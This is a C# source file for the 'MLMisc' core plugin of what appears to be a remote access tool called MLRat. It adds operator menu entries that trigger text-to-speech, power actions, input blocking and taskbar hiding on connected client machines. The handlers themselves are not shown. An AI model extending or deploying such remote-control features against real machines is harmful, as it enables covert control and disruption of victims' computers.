using MLRat.Server;
using System;
using MLMiscServer.Handlers;
using ServerPlugin.InterfaceHandle;

namespace MLMiscServer
{
    class ServerPlugin : IServerPlugin
    {
        public MLPluginInfomation PluginInfomation
        {
            get
            {
                MLPluginInfomation infomation = new MLPluginInfomation("MLMisc");
                infomation.Description = "Core Plugin";
                infomation.Developer = "BahNahNah";
                return infomation;
            }
        }

        public void OnClientConnect(IClient client)
        {
            
        }

        public void OnClientDisconnect(IClient client)
        {
            
        }

        public void OnDataRetrieved(IClient client, object[] data)
        {
            
        }

        public void OnPluginLoad(IServerUIHandler UIHost)
        {
            MLRatContextEntry miscContext = new MLRatContextEntry() {Text = "Misc", Icon = "misc.png" };

            miscContext.SubMenus = new MLRatContextEntry[]
            {
                new MLRatContextEntry() {Text="Text to speech", Icon = "comment_edit.png", OnClick = MiscHandler.TextToSpeechContextCallback },
                new MLRatContextEntry() {Text="Computer Power", Icon = "power_surge.png", OnClick = MiscHandler.ComputerPowerContextCallback },
                new MLRatContextEntry() { Text = "Input", Icon="lock_edit.png", SubMenus=new MLRatContextEntry[] 
                {
                    new MLRatContextEntry() {Text = "Block Input", Icon = "lock.png" , OnClick = MiscHandler.BlockInputContextCallback},
                    new MLRatContextEntry() {Text = "Allow Input", Icon = "lock_break.png", OnClick = MiscHandler.AllowInputContextCallback }
                } },
                new MLRatContextEntry() {Text = "Taskbar", Icon = "controlbar.png", SubMenus = new MLRatContextEntry[]
                {
                    new MLRatContextEntry() {Text="Show", Icon = "show_detail.png", OnClick = MiscHandler.ShowTaskbarContextCallback },
                    new MLRatContextEntry() {Text="Hide", Icon = "hide_detail.png", OnClick = MiscHandler.HideTaskbarContextCallback }
                } }
            };


            UIHost.AddContext(miscContext);
        }
    }
}
